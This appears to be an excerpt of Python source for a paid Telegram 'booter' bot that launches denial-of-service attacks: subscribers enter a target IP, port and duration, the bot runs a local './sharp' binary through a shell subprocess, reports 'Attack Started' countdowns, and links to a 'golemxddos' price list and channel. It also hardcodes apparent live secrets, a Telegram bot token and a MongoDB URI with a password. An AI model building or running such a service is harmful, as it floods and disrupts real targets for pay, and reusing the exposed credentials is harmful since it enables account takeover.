...
TOKEN = '8182911562:AAGHfQnIUmefuCtVMO0w2zDQwfPUdAGYD68'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = -1002313804043
CHANNEL_ID = -1002313804043
error_channel_id = -1002313804043
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 250")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Please contact the owner for assistance: @GOLEM_OWNER.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        ...
        sent_message = bot.send_message(chat_id, f"*🚀 Attack Started! 🚀*\n\n"
        ...
        for remaining_time in range(duration, 0, -1):
            ...
            new_message_text = (f"*🚀 Attack Started! 🚀*\n\n"
                                f"*📡 Target Host: {target_ip}*\n"
                                f"*👉 Target Port: {target_port}*\n"
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/golemxddos/3")
            markup.add(button1)
            markup.add(button2)
        else:
            ...
            button = types.InlineKeyboardButton(
                text="😈 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 😈", url="https://t.me/golemxddos")
            markup.add(button)
